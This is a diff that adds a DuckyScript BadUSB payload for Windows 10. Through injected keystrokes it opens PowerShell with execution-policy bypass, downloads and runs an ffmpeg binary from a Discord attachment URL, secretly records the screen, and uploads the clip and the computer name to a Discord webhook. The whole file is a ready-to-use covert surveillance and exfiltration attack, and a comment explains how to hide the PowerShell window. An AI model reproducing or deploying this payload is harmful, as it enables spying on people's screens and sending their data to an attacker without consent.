@@ -1,0 +1,21 @@
+REM Title: Record Screen To Discord
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: record a 30 second mkv file of the screen and send to discord.
+REM Target: Windows 10
+
+REM SETUP
+REM replace YOUR_WEBHOOK_HERE (below) with your discord webhook.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+GUI r
+DELAY 750
+
+REM open powershell (add "-W Hidden" to hide the window).
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 5000
+
+STRING $hookurl = 'YOUR_WEBHOOK_HERE';Function RecordScreen{param ([int[]]$t);$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json ;Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys;$Path = "$env:Temp\ffmpeg.exe";If (!(Test-Path $Path)){$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe";iwr -Uri $url -OutFile $Path};sleep 1;$mkvPath = "$env:Temp\ScreenClip.mkv";if ($t.Length -eq 0){$t = 10};.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath;curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null;sleep 1;rm -Path $mp3Path -Force}RecordScreen -t 30;exit
+ENTER
